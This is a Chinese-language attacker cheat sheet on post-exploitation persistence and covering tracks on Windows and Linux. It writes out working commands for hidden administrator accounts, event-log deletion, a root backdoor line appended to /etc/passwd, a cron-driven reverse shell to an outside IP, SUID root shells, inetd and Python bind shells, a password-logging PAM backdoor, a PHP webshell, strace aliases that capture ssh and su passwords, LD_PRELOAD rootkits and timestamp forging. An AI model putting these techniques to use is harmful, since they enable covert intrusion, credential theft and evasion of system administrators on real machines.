# 权限维持与反侦察

---

## Reference
- [linux常见backdoor及排查技术](https://xz.aliyun.com/t/4090)
- [Linux后门整理合集](https://www.secpulse.com/archives/59674.html)

---

# win
## 后门

```bash
net user PHPNET$ 1234abcd~ /add  # 添加用户
# Windows 的帐号名称后带着"$"符号时,不会在 net user 命令中显示出帐号信息
net localgroup administrators PHPNET$ /add  # 将用户添加到管理组
net user PHPNET$ /del   # 删除用户

query user   # 查看会话

logoff ID号  # 踢掉
```

## 痕迹清理

**删除日志文件**
```bash
net stop eventlog    # 停止服务
del c:\Windows\System32\Winevt\Logs\* /Q
```

---

# linux
## 后门

**添加root权限后门用户**

我们的目标就是在这个文件中追加一条，一个带有密文且 id 为 0 的账号。

密码加密使用下面的命令 `perl -e 'print crypt("password", "AA"). "\n"'`

所以我们最终想要在 passwd 文件中的条目是这个样子 `backdoor:AA6tQYSfGxd/A/A:0:0:me:/root:/bin/bash`

执行写入 `echo "backdoor:AA6tQYSfGxd/A:0:0:me:/root:/bin/bash">>/etc/passwd`

**Crond 开机自启后门**

先创建 /etc/xxxx 脚本文件(名字自己改)，利用该脚本进行反弹。以下脚本代表全自动反弹到 8.8.8.8 的 53 端口。
```vim
vim /etc/xxxx
    #!/bin/bash
    if netstat -ano|grep -v grep | grep "8.8.8.8">/dev/null
    then
    echo "OK">/dev/null
    else
    /sbin/iptables --policy INPUT ACCEPT
    /sbin/iptables --policy OUTPUT ACCEPT
    bash -i >& /dev/tcp/8.8.8.8/53 0>&1
    fi

chmod +sx /etc/xxxx
```
```vim
vim /etc/crontab
    */1 * * * * root /etc/xxxx

service cron reload #不同发行版重启方式不一样
service cron start
```

然后在 8.8.8.8 的服务器上使用 NC 接收 Shell 即可。

`nc -vv -lp 53`

**SUID shell**

首先, 先切换成为root用户，并执行以下的命令:
```bash
dawg:~# cp /bin/bash /.woot
dawg:~# chmod 4755 /.woot
dawg:~# ls -al /.woot
-rwsr-xr-x 1 root root 690668 Jul 24 17:14 /.woot
```
当然, 你也可以起其他更具备隐藏性的名字,我想猥琐并机智的你，肯定能想出很多好的名字的。
文件前面的那一点也不是必要的，只是为了隐藏文件( 在文件名的最前面加上“.”，就可以在任意文件目录下进行隐藏) .
```bash
# 现在，做为一个普通用户，我们来启用这个后门:
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw)
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw).woot-2.05b$
# 为什么不行呢? 因为 bash2 针对 suid有一些护卫的措施. 但这也不是不可破的:
```
```bash
/.woot -p
id
    uid=1000(fw) gid=1000(fw) euid=0(root) groups=1000(fw)
# 使用-p参数来获取一个root shell. 这个euid的意思是 effective user id
# 这里要特别注意的是，作为一个普通用户执行这个SUID shell时，一定要使用全路径。
```
如何查找那些具有 SUID 的文件: `dawg:~# find / -perm +4000 -ls` 这时就会返回具有 SUID 位的文件啦。

**远程后门**

```vim
vim /etc/inetd.conf
    #discard stream tcp nowait root internal
    #discard dgram udp wait root internal
    daytime stream tcp nowait root /bin/bash bash -i

inetd
然后就可以用nc来爆菊
```
可以修改/etc/services文件，加入以下的东西
```vim
vim /etc/services
    woot 6666/tcp #evil backdoor service
vim /etc/inetd.conf
    woot stream tcp nowait root /bin/bash bash -i
```

**PAM后门**

主要思路:pam_unix_auth.c 打补丁安装到正常的 PAM 模块中。
1、获取目标系统所使用的 PAM 版本：
`rpm -qa |grep pam`
2、编译安装 PAM
3、将本地 pam_unix_auth.c 文件通过打补丁方式，编译生成。
4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，后门密码为 root123,并会在 /tmp/pslog 记录 root 登录密码。

**vim后门**

此方法适用于安装了 vim 且安装了 python 扩展(绝大版本默认安装)的 linux 系统,至于恶意脚本 dir.py 的内容可以是任何功能的后门。如 python 版本的正向后门监听 11 端口。

检测有无扩展
```bash
vim --version | grep python
```

enter the mal script directory 、execute the script and then remove the script
`cd /usr/lib/python2.7/site-packages`

```python
vim dir.py
#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html
from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',11))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                stdout=talk, stderr=talk, shell=True)
```
`$(nohup vim -E -c "pyfile dir.py"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py`

read more [[DARK] Weapons of Text Destruction](https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf)

**终端解析 \r 导致的问题**
```bash
echo -e "<?=\`\$_POST[good]\`?>\r<?='PHP Test Page >||<                  ';?>" >/var/www/html/test.php
```

**strace 记录 ssh 登录密码**

注意 bash_profile 是在登录的 shell 执行的，bashrc 是在非登录的 shell 执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在 .bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在 .bashrc 中。
```bash
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh'
# 也可记录 su 密码
alias su='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 su'

grep "read(3" /tmp/sshpwd-名字自己补全  | tail -n 11
```

**预加载型动态链接库后门 ld.so.preload**

在 linux 下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生 Hijack
strace 命令 id 的时候可以发现有预先去读取 `/etc/ld.so.preload` 文件(也可使用设置 LD_PRELAOD 环境变量方式)，如果我们将事先写好的恶意 so 文件位置写入 ld.so.preload 文件，这个时候就会达到“劫持”的效果。
比较好用的工具有 Vegile 和 cub3 等
[cub3](https://github.com/mempodippy/cub3),这个工具使用了 LD_PRELOAD 和系统的扩展属性去隐藏文件。
其中还有一种是通过修改动态链接器来加载恶意动态链接库的后门，通过替换或者修改动态链接器中的默认预加载配置文件 `/etc/ld.so.preload` 路径的 rootkit，此方法更加隐蔽，这个方法的较成熟的利用工具是 [Vlany](https://github.com/mempodippy/vlany)

**Vegile**

This tool will set up your backdoor/rootkits when backdoor is already setup it will be hidden your specific process,unlimited your session in metasploit and transparent. Even when it is killed, it will re-run again. There will always be a procces which will run another process, so we can assume that this procces is unstopable like a Ghost in The Shell
```bash
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
鸽
```

**进程注入**

使用 ptrace 向进程中注入恶意 so 文件工具[linux-inject](https://github.com/gaffe23/linux-inject/)

**内核级 rootkit**

如 mafix、[Diamorphine](https://github.com/m0nad/Diamorphine)

## 隐藏进程

**藏文件和文件夹**
1. 比如创建一个名字开头带 `.` 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。(查看方法：ls -a)

    ```
    touch .webshell.php    创建名字为 .webshell.php 的文件
    mkdir .backdoor/       创建名字为 .backdoor 的文件夹
    ```

2. 除非在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。如果是文件的话浏览器访问直接输 ... 就行，目录同理。

    ```
    touch ...       创建名字为 ... 的文件
    mkdir ...       创建名字为 ... 的文件夹
    ```

**Linux/Unix 修改文件时间戳**

直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。
`touch -t 1401021042.30 webshell.php`

